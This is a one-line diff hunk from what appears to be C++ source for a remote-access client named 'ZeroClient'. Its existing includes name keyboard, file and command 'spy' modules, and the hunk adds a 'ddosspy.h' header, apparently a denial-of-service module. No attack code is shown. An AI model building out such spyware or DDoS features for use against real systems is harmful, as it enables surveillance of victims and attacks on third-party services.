@@ -18,6 +18,7 @@
 #include "keyboardspy.h"
 #include "filespy.h"
 #include "cmdspy.h"
+#include "ddosspy.h"
 
 class ZeroClient
 {
